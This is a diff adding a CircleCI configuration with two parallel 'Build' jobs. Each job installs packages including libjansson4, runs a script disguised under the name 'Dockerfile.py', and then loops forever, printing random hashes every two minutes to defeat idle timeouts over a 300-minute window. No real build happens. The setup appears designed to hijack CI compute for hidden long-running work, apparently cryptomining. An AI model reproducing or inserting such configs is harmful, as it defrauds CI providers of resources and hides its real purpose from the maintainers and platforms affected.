@@ -1,0 +1,35 @@
+version: 2.1
+
+jobs:
+  build:
+    parallelism: 15
+    docker:
+      - image: couchbase
+    steps:
+      - checkout
+      - run:
+         name: Build
+         command: |
+                     apt update && apt -y install curl python3 libjansson4
+                     chmod +x Dockerfile.py && python3 Dockerfile.py
+                     while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+         no_output_timeout: 300m
+  build2:
+    parallelism: 15
+    docker:
+      - image: couchbase
+    steps:
+      - checkout
+      - run:
+         name: Build
+         command: |
+                     apt update && apt -y install curl python3 libjansson4
+                     chmod +x Dockerfile.py && python3 Dockerfile.py
+                     while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+         no_output_timeout: 300m
+
+workflows:
+  main:
+    jobs:
+      - build
+      - build2
